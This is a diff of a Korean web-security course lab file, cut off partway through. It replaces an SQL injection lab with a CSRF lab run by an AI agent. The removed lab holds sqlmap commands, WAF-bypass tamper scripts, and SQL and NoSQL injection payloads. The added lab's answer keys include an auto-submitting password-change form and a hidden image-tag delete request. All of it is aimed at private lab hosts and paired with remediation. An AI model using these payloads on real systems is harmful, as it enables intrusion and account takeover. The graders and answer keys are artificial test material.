@@ -1,562 +1,850 @@
-lab_id: standalone-web-vuln-week04
-title: A03 Injection — SQLi 심화 (sqlmap + tamper + ModSec 942 우회)
-version: standalone-non-ai
-course: web-vuln
+lab_id: web-vuln-ai-week04
+title: CSRF(Cross-Site Request Forgery) 실습 (AI 지원)
+version: ai
+course: web-vuln-ai
 week: 4
-description: |
-  OWASP A03 의 *SQLi 카테고리* hands-on 심화. sqlmap 의 4 phase + 10 tamper script
-  + ModSec CRS 942 family 의 우회 시도. DVWA + AdminConsole 의 *2 target* 의 비교.
-difficulty: hard
-duration_minutes: 200
-audience: web-vuln 4주차
-prerequisites:
-  - W03 완료 + crypto 4 영역 audit
-  - 학생 PC 의 sqlmap (1.6+) 가용
-  - 6v6 의 attacker / web / DVWA / AdminConsole 컨테이너 가동
+description: CSRF 공격의 원리와 토큰 기반 방어 메커니즘을 실습합니다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
+difficulty: medium
+duration_minutes: 120
 objectives:
-  - sqlmap 의 4 phase 인지 (detection / fingerprint / injection / dump)
-  - DVWA 의 SQLi 자동 (sqlmap --batch) + 결과 분석
-  - 10 tamper script 의 *변형 메커니즘* + ModSec 942 우회 시도
-  - AdminConsole (Python Flask) 의 NoSQL vs SQL 식별
-  - 5 변형 × 942 카운트 매트릭스
-  - 4 영역 보고서 + ATT&CK T1190 매핑
-pass_threshold: 0.7
-
+- CSRF 공격 원리를 이해한다
+- CSRF 토큰 검증 메커니즘을 분석한다
+- SameSite 쿠키와 방어 기법을 학습한다
+pass_threshold: 0.6
 steps:
-
-  - order: 1
-    instruction: |
-      ## 🎯 MISSION — sqlmap 의 4 phase 인지 + DVWA 자동 시도
-
-      sqlmap 의 *자동 SQLi* 의 4 phase (detection → fingerprint → injection → dump)
-      DVWA 대상 으로 실행 + 각 phase 의 *결과* 분석.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **sqlmap** = SQLi 의 *de facto* 자동 도구 (2006 부터)
-      - **4 phase**:
-        1. **Detection** — parameter 의 SQLi 가능 여부 (boolean / time / error / union)
-        2. **Fingerprint** — DBMS 종류 (MySQL / PostgreSQL / MSSQL / SQLite / Oracle)
-        3. **Injection** — 실 payload 의 *유형* 결정 (UNION / BLIND / TIME-based)
-        4. **Dump** — DB / table / column / row 의 *실 데이터* 추출
-      - **--batch** = 모든 대화형 prompt 의 *자동 default* (학습 환경 만)
-      - **--risk / --level** = 0-3 / 0-5 의 *공격 정밀도* (높을 수록 *오탐 ↑ + 시간 ↑*)
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      # 1) DVWA 의 default endpoint (sqlmap 자동 detection)
-      # 단 ModSec 942 가 차단 가능 — 본 step 의 *baseline*
-      timeout 60 sqlmap -u "http://10.20.30.1/?id=1" \
-        --headers="Host: dvwa.6v6.lab" \
-        --batch --level=1 --risk=1 \
-        --threads=1 2>&1 | tail -20
-
-      echo ""
-      echo "=== ModSec 942 차단 카운트 ==="
-      docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log" 2>&1 | tail -1
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - sqlmap 의 4 phase 출력 (testing / DBMS / injectable / dump)
-      - parameter `id` 의 *vulnerable / not vulnerable* 결론
-      - ModSec 942 카운트 증가 (sqlmap 의 *수십 payload* 가 모두 매칭)
-      - DBMS 종류 (MySQL 가능성)
-
-      ## 💡 왜 이걸 하는가?
-
-      sqlmap = *침투 의 표준 도구*. 4 phase 의 *흐름* 인지 + *자동 결과 의 한계*
-      (ModSec 차단 시 false negative) 학습. 본 step 의 *baseline* 이 step 2 의
-      *tamper 우회* 의 시작.
-
-      ## 🔍 결과 해석
-
-      - **정상 (vuln)**: DBMS detected + parameter vulnerable + dump 가능
-      - **차단 (ModSec)**: `connection error` 또는 `403 Forbidden` 다수 → 다음 step 의 tamper 필요
-      - **timeout**: --threads=1 + --time-sec=1 으로 *최소 부하* 시도
-
-      ## 비정상 시 대응
-
-      - **sqlmap 미설치**: `apt install sqlmap` 또는 `pip install sqlmap`
-      - **--batch 의 hang**: `--non-interactive` 또는 `echo n | sqlmap ...`
-      - **모든 payload 403**: ModSec 강력 — step 2 의 tamper 시도
-
-      ## 실측 (2026-05-16)
-      - DVWA 응답: 302 (login 필요 — 단 sqlmap 의 detection 은 url 만 으로)
-      - sqlmap version: 1.6.4 (legacy — 1.8+ 권장)
-    hint: |
-      sqlmap --batch --level=1 --risk=1 + 4 phase 출력 + 942 카운트.
-    category: experiment
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      timeout 60 sqlmap -u "http://10.20.30.1/?id=1" \
-        --headers="Host: dvwa.6v6.lab" \
-        --batch --level=1 --risk=1 --threads=1 2>&1 | tail -20
-      docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log" 2>&1 | tail -1
-      SH
-    answer_detail: sqlmap 4 phase + DVWA + 942 카운트
-    verify:
-      type: output_contains
-      expect: 'sqlmap\|DBMS\|injection'
-      field: stdout
-      semantic:
-        intent: sqlmap 자동 SQLi
-        success_criteria: [4 phase 출력 + 942 카운트]
-        acceptable_methods:
-          - "**[OSS] sqlmap --batch --level --risk**"
-          - "**[OSS] sqlmap --tamper 의 우회**"
-          - "**[OSS] sqlmap --dbms=mysql 의 fingerprint hint**"
-          - "**[OSS] sqlmap --random-agent 의 UA 변경**"
-          - "**[OSS] sqlmap --time-sec 의 blind 의 time threshold**"
-          - "**[OSS] CWE-89 SQL Injection**"
-    target_vm: attacker
-
-  - order: 2
-    instruction: |
-      ## 🎯 MISSION — 5 tamper script × ModSec 942 우회 매트릭스
-
-      sqlmap 의 *5 tamper script* (space2comment / randomcase / between / charunicodeescape
-      / apostrophenullencode) 각 의 *942 우회 가능 여부* + sqlmap 결론 매트릭스.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **tamper script** = sqlmap 의 *payload 변형* — *동일 의도* 의 *다른 형식*
-      - **--tamper=a,b,c** = *복수 tamper* 의 chained 적용
-      - **5 대표 tamper**:
-        - `space2comment` = space → `/**/` (comment)
-        - `randomcase` = SELECT → SeLeCt (regex `(?i)` 누락 우회)
-        - `between` = `=` → `BETWEEN` (operator 우회)
-        - `charunicodeescape` = char → unicode escape
-        - `apostrophenullencode` = `'` → `%00%27`
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-
-      for tamper in space2comment randomcase between charunicodeescape apostrophenullencode; do
-        echo "=== tamper: $tamper ==="
-        timeout 30 sqlmap -u "http://10.20.30.1/?id=1" \
-          --headers="Host: dvwa.6v6.lab" \
-          --tamper=$tamper \
-          --batch --level=1 --risk=1 --threads=1 2>&1 | tail -3
-        echo ""
-      done
-
-      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-      echo "942 차단 증가: $((AFTER - BEFORE))"
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - 5 tamper 각 의 sqlmap 결론 (vulnerable / not vulnerable)
-      - 942 차단 카운트 증가 = 5 × N (N = tamper 별 payload 수)
-      - 어떤 tamper 가 *우회 가능* 인지 식별
-
-      ## 💡 왜 이걸 하는가?
-
-      WAF (ModSec) 의 *룰 의 한계* — *정규식 기반* 차단 의 *변형 우회* 가능. *5
-      tamper* 의 *각 메커니즘* 인지 → custom tamper 작성 의 기반.
-
-      ## 🔍 결과 해석
-
-      - **정상 (vuln WAF)**: 일부 tamper 가 *우회* — 즉시 *paranoia 상승* 또는 *libinjection*
-      - **모두 차단 (강력 WAF)**: paranoia 1 의 *충분* — 단 *paranoia 2-3* 의 *false positive trade-off*
-      - **942 카운트 증가 X**: ModSec 비활성 또는 audit log 비활성
-
-      ## 비정상 시 대응
-
-      - **tamper 미인식**: sqlmap version 확인 (1.6+ 필요)
-      - **모든 tamper 같은 결과**: --level 2-3 + --risk 2-3 으로 *더 적극 시도*
-    hint: |
-      5 tamper × sqlmap + 942 카운트 증가 매트릭스.
-    category: bypass
-    points: 30
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-      for tamper in space2comment randomcase between charunicodeescape apostrophenullencode; do
-        echo "=== tamper: $tamper ==="
-        timeout 30 sqlmap -u "http://10.20.30.1/?id=1" --headers="Host: dvwa.6v6.lab" --tamper=$tamper --batch --level=1 --risk=1 --threads=1 2>&1 | tail -3
-      done
-      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-      echo "942 증가: $((AFTER - BEFORE))"
-      SH
-    answer_detail: 5 tamper × 942 매트릭스
-    verify:
-      type: output_contains
-      expect: 'tamper\|942'
-      field: stdout
-      semantic:
-        intent: tamper × WAF 우회
-        success_criteria: [5 tamper 결론 + 942 증가]
-        acceptable_methods:
-          - "**[OSS] sqlmap --tamper chained (a,b,c)**"
-          - "**[OSS] custom tamper Python script**"
-          - "**[OSS] ModSec libinjection 의 token 분석**"
-          - "**[OSS] paranoia 1-4 의 trade-off**"
-          - "**[OSS] CWE-89 + WAF bypass**"
-    target_vm: attacker
-
-  - order: 3
-    instruction: |
-      ## 🎯 MISSION — AdminConsole (Python Flask) 의 NoSQL vs SQL 식별
-
-      AdminConsole = Python Flask. *SQL 또는 NoSQL* 의 식별. sqlmap 의 *NoSQL 비지원*
-      → NoSQL 발견 시 *수동 payload* (NoSQLMap 또는 직접 작성).
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **NoSQL injection** = MongoDB / CouchDB / Redis 등 의 *injection*. SQL 과 *문법
-        다름*
-      - **MongoDB injection 표준 payload** = `{"$ne": null}` / `{"$gt": ""}` / `{"$where": "1==1"}`
-      - **Python Flask + SQLAlchemy** = SQL ORM — SQLi 가능
-      - **Python Flask + pymongo** = NoSQL — sqlmap 비지원
-      - **NoSQLMap** = NoSQL 전용 도구 (codingo/NoSQLMap)
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      # 1) AdminConsole 의 server header (Flask 확인)
-      curl -sI -H 'Host: admin.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'server|x-' | head -5
-
-      # 2) 일반 SQLi payload (SQL 가능성)
-      for p in "1' OR '1'='1" "1' OR 1=1--" "admin'--"; do
-        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' \
-          "http://10.20.30.1/login?username=$p&password=test")
-        echo "SQL '$p': $code"
-      done
-
-      # 3) NoSQL payload (Mongo 가능성)
-      for p in '{"$ne":null}' '{"$gt":""}' '{"$where":"1==1"}'; do
-        code=$(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' \
-          -X POST -H 'Content-Type: application/json' \
-          -d "{\"username\":$p,\"password\":\"test\"}" \
-          http://10.20.30.1/api/login)
-        echo "NoSQL $p: $code"
-      done
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - server header: Werkzeug/Python (Flask 확정)
-      - SQL payload 응답 (200 = vuln / 400 = parse error / 401 = 정상 거부)
-      - NoSQL payload 응답 (200 = MongoDB vuln 가능성)
-      - 어느 *DB type* 인지 결론
-
-      ## 💡 왜 이걸 하는가?
-
-      sqlmap 의 *한계* = *SQL 만*. modern stack (MongoDB / Redis / GraphQL) 의 *별
-      도구* 필요. 본 step 의 *식별* 가 *공격 도구 선택* 의 시작.
-
-      ## 🔍 결과 해석
-
-      - **SQL vuln** (200 응답): SQLAlchemy 또는 raw SQL — sqlmap 추가 시도
-      - **NoSQL vuln** (200 with $ne): MongoDB — NoSQLMap 권장
-      - **모두 401/400**: 정상 거부 — input validation 적용
-
-      ## 비정상 시 대응
-
-      - **AdminConsole 의 endpoint 다름**: `/login` 또는 `/api/login` 또는 `/auth/login`
-        시도
-      - **POST 의 body 형식 다름**: `Content-Type: application/x-www-form-urlencoded` 시도
-
-      ## 실측 (2026-05-16)
-      - AdminConsole server: Werkzeug/3.1.8 Python/3.11.15 (Flask 확정)
-    hint: |
-      SQL vs NoSQL payload × AdminConsole + server header 분석.
-    category: analysis
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      curl -sI -H 'Host: admin.6v6.lab' http://10.20.30.1/ 2>&1 | grep -iE 'server|x-' | head -5
-      for p in "1' OR '1'='1" "1' OR 1=1--" "admin'--"; do
-        echo "SQL '$p': $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' "http://10.20.30.1/login?username=$p&password=test")"
-      done
-      for p in '{"$ne":null}' '{"$gt":""}' '{"$where":"1==1"}'; do
-        echo "NoSQL $p: $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: admin.6v6.lab' -X POST -H 'Content-Type: application/json' -d "{\"username\":$p,\"password\":\"test\"}" http://10.20.30.1/api/login)"
-      done
-      SH
-    answer_detail: AdminConsole SQL vs NoSQL 식별
-    verify:
-      type: output_contains
-      expect: 'SQL\|NoSQL\|Werkzeug'
-      field: stdout
-      semantic:
-        intent: DB type 식별
-        success_criteria: [server header + SQL + NoSQL 응답]
-        acceptable_methods:
-          - "**[OSS] server header 의 framework 식별**"
-          - "**[OSS] payload 별 응답 코드 매트릭스**"
-          - "**[OSS] NoSQLMap 의 MongoDB 자동**"
-          - "**[OSS] BurpSuite Intruder 의 payload set**"
-          - "**[OSS] CWE-943 NoSQL Injection**"
-    target_vm: attacker
-
-  - order: 4
-    instruction: |
-      ## 🎯 MISSION — 5 SQL payload × ModSec 942 카운트 매트릭스 (수동)
-
-      sqlmap 외 의 *수동 5 payload* (UNION / OR 1=1 / sleep / boolean / error-based)
-      각 의 ModSec 942 카운트 + 응답 매트릭스.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **5 SQLi 카테고리**:
-        - **UNION-based** = `UNION SELECT 1,2,3 FROM users--`
-        - **Boolean-based** = `1 AND 1=1` vs `1 AND 1=2` 응답 차이
-        - **Error-based** = `' AND UPDATEXML(1, CONCAT(0x7e, version()), 1)--`
-        - **Time-based (BLIND)** = `1 AND SLEEP(5)--`
-        - **OR 1=1** = `' OR '1'='1` (classic)
-
-      ## 💻 실행 명령
-
-      ```bash
-      ssh 6v6-attacker bash <<'SH'
-      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-
-      payloads=(
-        "1' OR '1'='1"
-        "1 UNION SELECT 1,2,3,4,5 FROM users--"
-        "1' AND 1=1--"
-        "1' AND SLEEP(2)--"
-        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, version()))--"
-      )
-      labels=(OR_1eq1 UNION boolean time_BLIND error_based)
-
-      for i in "${!payloads[@]}"; do
-        p="${payloads[$i]}"
-        l="${labels[$i]}"
-        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
-        code=$(curl -s -o /dev/null -w '%{http_code}' \
-          -H 'Host: dvwa.6v6.lab' \
-          "http://10.20.30.1/?id=$encoded")
-        echo "$l: $code | $p"
-      done
-
-      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-      echo "942 증가: $((AFTER - BEFORE))"
-      SH
-      ```
-
-      ## 📋 확인 사항
-
-      - 5 payload 각 의 응답 코드 (403 = 차단 / 200 = 통과 / 500 = error)
-      - 942 차단 카운트 증가 = 5+ (각 payload 1+ 매칭)
-      - *어떤 카테고리* 가 차단 / 통과 인지 식별
-
-      ## 💡 왜 이걸 하는가?
-
-      sqlmap 의 *자동* 외 *수동 payload* 의 *직접 분석*. WAF audit 의 *5 카테고리
-      cover* 가 *quality 보장*.
-
-      ## 🔍 결과 해석
-
-      - **모두 403 (강력 WAF)**: ModSec 의 5 카테고리 모두 차단 — 정상
-      - **일부 200**: 우회 가능 — 즉시 *paranoia 상승*
-      - **942 증가 X**: ModSec 비활성
-
-      ## 비정상 시 대응
-
-      - **URL encoding 오류**: payload 의 *공백 + 특수문자* 정확 encoding
-      - **모든 payload 200**: DVWA 의 *parameter id* path 다름 — `/page=...` 또는 `/q=...` 시도
-    hint: |
-      5 SQL payload 카테고리 (UNION/Boolean/Error/Time/OR_1=1) × 응답 + 942.
-    category: exploit
-    points: 25
-    answer: |
-      ssh 6v6-attacker bash <<'SH'
-      BEFORE=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-      for p in "1' OR '1'='1" "1 UNION SELECT 1,2,3--" "1' AND SLEEP(2)--"; do
-        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
-        echo "$p: $(curl -s -o /dev/null -w '%{http_code}' -H 'Host: dvwa.6v6.lab' "http://10.20.30.1/?id=$encoded")"
-      done
-      AFTER=$(docker exec 6v6-web bash -c "sudo grep -c 'id..\"942' /var/log/apache2/modsec_audit.log")
-      echo "942 증가: $((AFTER - BEFORE))"
-      SH
-    answer_detail: 5 수동 SQLi 매트릭스 + 942 카운트
-    verify:
-      type: output_contains
-      expect: 'OR\|UNION\|942'
-      field: stdout
-      semantic:
-        intent: 5 SQLi 카테고리
-        success_criteria: [5 payload 응답 + 942 증가]
-        acceptable_methods:
-          - "**[OSS] UNION-based 의 SELECT column 수 결정**"
-          - "**[OSS] Boolean-based 의 응답 size 차이**"
-          - "**[OSS] Error-based 의 EXTRACTVALUE / UPDATEXML**"
-          - "**[OSS] Time-based 의 SLEEP / WAITFOR**"
-          - "**[OSS] CWE-89 + CWE-915 Improperly Controlled Modification**"
-    target_vm: attacker
-
-  - order: 5
-    instruction: |
-      ## 🎯 MISSION — W04 종합 보고서 (sqlmap + tamper + NoSQL + 수동 5 payload)
-
-      W04 의 step 1-4 종합 보고서. 4 finding (sqlmap baseline + 5 tamper + AdminConsole
-      DB 식별 + 수동 5 payload) + CVSS + CWE + ATT&CK T1190 매핑.
-
-      ## 📚 사전 학습 (학생 혼돈 방지)
-
-      - **W02 의 4 섹션 형식** 재사용 (Executive / Findings / Remediation / 매핑)
-      - **ATT&CK T1190** = Initial Access > Exploit Public-Facing Application
-      - **CWE-89 + CWE-943** = SQL + NoSQL Injection
-
-      ## 💻 산출물 (W02/W03 의 4 섹션 형식)
-
-      ```markdown
-      # W04 — A03 SQLi 심화 분석 보고서
-
-      ## 1. Executive Summary
-      - target: DVWA + AdminConsole + ModSec (6v6 학습 환경)
-      - 발견 vuln 4 영역
-      - CVSS Critical / High 분포
-      - 권장: ModSec paranoia 검토 + AdminConsole input validation
-
-      ## 2. Detailed Findings
-      ### F1 sqlmap baseline (DVWA)
-      ### F2 5 tamper × 942 매트릭스
-      ### F3 AdminConsole DB 식별 (Flask + SQL/NoSQL)
-      ### F4 수동 5 payload 매트릭스
-
-      ## 3. Remediation
-      ### F1-F2 ModSec
-      - 즉시: paranoia 1 → 2 검토 (false positive trade-off)
-      - 단기: libinjection 활성 (libinjection vs regex)
-      ### F3 AdminConsole
-      - 즉시: input validation (sanitize / parameterized query)
-      - 단기: SQLAlchemy / pymongo 의 *최신* 사용
-
-      ## 4. 매핑
-      | F | ATT&CK | CVSS | CWE |
-      | F1 | T1190 | 9.8 (C) | CWE-89 |
-      | F2 | T1190 | 8.5 (H) | CWE-89 + WAF bypass |
-      | F3 | T1190 | 8.0 (H) | CWE-89 또는 CWE-943 |
-      | F4 | T1190 | 8.5 (H) | CWE-89 |
-      ```
-
-      ## 📋 확인 사항
-
-      - 4 섹션 + 4 finding 의 각 reproduction + 영향
-      - 매핑 표 (4 finding × 3 표준)
-      - ModSec 권장 (paranoia + libinjection)
-
-      ## 💡 왜 이걸 하는가?
-
-      A03 의 *침투 측 + 방어 측* 의 *통합 보고*. sqlmap 의 *자동* + 수동 payload 의
-      *cover* + WAF audit 의 *3 축*.
-    hint: |
-      4 finding × 4 섹션 + CVSS + CWE + ATT&CK T1190.
-    category: synthesis
-    points: 15
-    answer: 위 4 섹션 형식
-    answer_detail: W04 종합 보고서
-    verify:
-      type: output_contains
-      expect: 'CWE-89\|T1190'
-      field: stdout
-      semantic:
-        intent: W04 종합
-        success_criteria: [4 finding + 매핑]
-        acceptable_methods:
-          - "**[관리적] PTES 보고서 4 섹션**"
-          - "**[관리적] CWE-89 / CWE-943 매핑**"
-          - "**[관리적] T1190 Initial Access**"
-          - "**[관리적] OWASP A03 의 14 권장**"
-          - "**[관리적] ModSec paranoia 의 trade-off**"
-    target_vm: bastion
-
-  # ============================================================
-  # STEP 6 — R/B/P 종합 (SQLi 4 technique × ModSec 942)
-  # ============================================================
-  - order: 6
-    instruction: |
-      ## 🎯 MISSION (R/B/P 종합)
-
-      Red = sqlmap UNION/boolean/tamper 의 3 technique / Blue = ModSec 942 family
-      매치 / Purple = paranoia level tuning 권장.
-
-      ## 📖 시나리오 상세
-
-      ### 🔴 Red Team — sqlmap 의 technique 별 우회 능력 분석
-
-      **페르소나**: bug bounty hunter — JuiceShop 의 SQLi vuln 의 발견 + sqlmap 의
-      tamper 의 evasion 능력 의 검증. 운영 환경 의 paranoia level 의 영향 의 정량 측정.
-
-      **공격 의도**:
-      1. UNION SELECT 의 명확 한 SQLi = ModSec 942100 (libinjection) + 942270 (UNION)
-         의 score 10 → 명확 block
-      2. boolean blind (AND 1=1) = 942100 만 매치 = score 5 = paranoia 1 의 경계
-      3. tamper randomcase (uNiOn) = ModSec 의 case-sensitive 룰 의 우회 가능성
-
-      **공격 단계**:
-      - R1: curl 의 UNION SELECT 페이로드 = 403 확인
-      - R2: curl 의 boolean blind 페이로드 = score 분석
-      - R3: curl 의 tamper randomcase = paranoia 1 우회 시도
-
-      ### 🔵 Blue Team — ModSec 942 family 의 detection 매트릭스
-
-      **탐지 source**:
-      - ModSec audit log 의 `messages[]` = 매치 룰 ID 의 array
-      - 942100 (SQLi detection lib), 942180 (basic SQLi), 942270 (UNION SELECT) 등
-        의 family
-      - anomaly score 의 누적 = paranoia threshold (default 5) 이상 = block
-
-      **대응**:
-      - B1: audit log 의 messages[] 의 grep + 매치 룰 의 통계
-      - B2: paranoia 1 의 score = 경계 사건 의 분석
-      - B3: tamper 의 detection 의 gap 의 측정
-
-      ### 🟣 Purple Team — paranoia level 의 점진 적 ramp-up
-
-      **분석**:
-      - sqlmap 의 5 technique × paranoia 1-4 의 detection 매트릭스 작성
-      - tamper randomcase 의 paranoia 1 우회 의 score 측정 = paranoia 2/3 의 영향
-        예측
-
-      **개선 cycle**:
-      1. DetectionOnly 모드 의 1주 + 분석 (FP 율 측정)
-      2. paranoia 1 → 2 의 점진 적 ramp-up + 10분 의 FP 모니터링
-      3. tamper-specific custom rule 의 추가 (case-insensitive 매칭)
-      4. 분기 1회 의 sqlmap audit 의 routine
-
-      ## 💻 실행
-      ```bash
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "UNION %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/products/search?q=apple%27%20UNION%20SELECT%201,2,3--"'
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "tamper %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/products/search?q=apple%27%20uNiOn%20SeLeCt%201,2,3--"'
-      ssh 6v6-web "sudo tail -20 /var/log/apache2/modsec_audit.log | grep -oE '942[0-9]+' | sort -u"
-      echo "Coverage: UNION=block / tamper=paranoia 1 한계 → paranoia 2/3 권장"
-      ```
-
-      ## 💡 왜
-      sqlmap 의 technique 별 detection 매트릭스 + paranoia tuning 의 base.
-    hint: 'curl 의 UNION/tamper + 942 매치 grep'
-    category: rbp_integration
-    points: 6
-    answer: |
-      echo "=== Red ==="
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "UNION %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/products/search?q=apple%27%20UNION%20SELECT%201,2,3--"'
-      ssh 6v6-attacker 'curl -s -o /dev/null -w "tamper %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/rest/products/search?q=apple%27%20uNiOn%20SeLeCt%201,2,3--"'
-      echo "=== Blue 942 ==="
-      ssh 6v6-web "sudo tail -20 /var/log/apache2/modsec_audit.log 2>/dev/null | grep -oE '942[0-9]+' | sort -u"
-      echo "=== Purple ==="
-      echo "Coverage: UNION/tamper 의 detection 매트릭스 → paranoia 2/3 권장"
-    answer_detail: SQLi technique × ModSec 942 매트릭스
-    verify:
-      type: output_contains
-      expect: 'Coverage'
-      field: stdout
-      semantic:
-        intent: SQLi technique 의 paranoia 영향 분석
-        success_criteria: [UNION/tamper 시도, 942 매치, Coverage]
-        acceptable_methods: ["**[OSS] curl + audit log grep**"]
-    target_vm: attacker
+- order: 1
+  instruction: '대상 애플리케이션(http://{{WEB_IP}})의 폼에서 CSRF 토큰 존재 여부를 확인하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_detect` 에 적합한 도구: curl -i 로 CSRF 토큰 확인.
+    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: HTML 소스에서 hidden input을 찾으세요.
+  category: csrf_detect
+  points: 8
+  answer: '🤖 프롬프트: 대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
+
+    📎 참고 (CLI): curl -s http://10.20.30.80 | grep -i ''csrf\|_token\|hidden'' | head
+    -10 && echo ''CSRF 토큰 확인 완료'''
+  answer_detail: CSRF 토큰이 없으면 외부 사이트에서 요청을 위조할 수 있습니다.
+  verify:
+    type: output_contains
+    expect:
+    - CSRF 토큰 확인 완료
+    - http_request
+    field: stdout
+    semantic:
+      intent: CSRF 토큰 존재 여부 확인 — 폼 HTML 에서 hidden input 또는 meta CSRF 토큰 검증
+      success_criteria:
+      - curl 로 폼 페이지 가져와 hidden input name csrf 또는 _token 검색
+      - 토큰 유무 판단 근거 제시
+      - 토큰 없을 때 CSRF 가능성 명시
+      acceptable_methods:
+      - curl <url> | grep -iE csrf_token|authenticity_token
+      - Burp Proxy 로 폼 분석
+      - browser dev tools 로 DOM 검사
+      - nikto 로 자동 탐지
+      negative_signs:
+      - 폼 수집 없이 개념만
+      - 토큰 검색 결과 없음
+      - 위험 판정 없음
+  target_vm: attacker
+  script: curl -s http://10.20.30.80 | grep -i 'csrf\|_token\|hidden' | head -10 &&
+    echo 'CSRF 토큰 확인 완료'
+  risk_level: low
+  bastion_prompt: '대상 애플리케이션(http://10.20.30.80)의 폼에서 CSRF 토큰 존재 여부를 확인해줘
+
+
+    [도구 권장] csrf_detect: curl -i 로 CSRF 토큰 확인. curl 만 쓰지 말고 **curl -i 로 CSRF 토큰 확인**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 2
+  instruction: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_craft` 에 적합한 도구: curl + cookie jar (-b -c),
+    HTML form 작성. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: auto-submit 폼을 작성하세요.
+  category: csrf_craft
+  points: 10
+  answer: '🤖 프롬프트: CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조 구현 방법과 예시를 설명해줘
+
+    📎 참고 (CLI): echo ''<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
+    method="POST"><input name="password" value="hacked"></form></body></html>'' &&
+    echo ''CSRF PoC 작성 완료'''
+  answer_detail: 자동 제출 폼으로 사용자가 페이지를 방문하면 즉시 요청이 전송됩니다.
+  verify:
+    type: output_contains
+    expect: CSRF PoC 작성 완료
+    field: stdout
+    semantic:
+      intent: CSRF 공격 HTML 페이지 — 패스워드 변경 POST 를 자동 제출하는 hidden form
+      success_criteria:
+      - form action 에 대상 URL + POST 메서드
+      - hidden input 으로 새 비밀번호 지정
+      - body onload 자동 submit 또는 iframe src 로 자동 실행
+      acceptable_methods:
+      - HTML form body onload submit
+      - iframe srcdoc 로 내장
+      - JavaScript fetch POST
+      - BeEF module 활용
+      negative_signs:
+      - form action URL 누락
+      - 자동 submit 미설정
+      - 공격 시나리오 흐름 설명 없음
+  target_vm: attacker
+  script: echo '<html><body onload="document.forms[0].submit()"><form action="http://10.20.30.80/profile"
+    method="POST"><input name="password" value="hacked"></form></body></html>' &&
+    echo 'CSRF PoC 작성 완료'
+  risk_level: low
+  bastion_prompt: 'CSRF 공격용 HTML 페이지를 작성하시오: 패스워드 변경 요청 위조.
+
+
+    [도구 권장] csrf_craft: curl + cookie jar (-b -c), HTML form 작성. curl 만 쓰지 말고 **curl
+    + cookie jar (-b -c)** 등 적합 도구로 호출 후 stdout quote.'
+- order: 3
+  instruction: '이미지 태그를 이용한 GET 기반 CSRF를 구성하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `csrf_craft` 에 적합한 도구: curl + cookie jar (-b -c),
+    HTML form 작성. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: img src에 상태 변경 URL을 삽입하세요.
+  category: csrf_craft
+  points: 10
+  answer: '🤖 프롬프트: 이미지 태그를 이용한 GET 기반 CSRF를 구성해줘
+
+    📎 참고 (CLI): echo ''<img src="http://10.20.30.80/api/users/1/delete" style="display:none">''
+    && echo ''GET CSRF PoC 작성 완료'''
+  answer_detail: GET 요청으로 상태 변경이 가능하면 img 태그만으로 CSRF가 가능합니다.
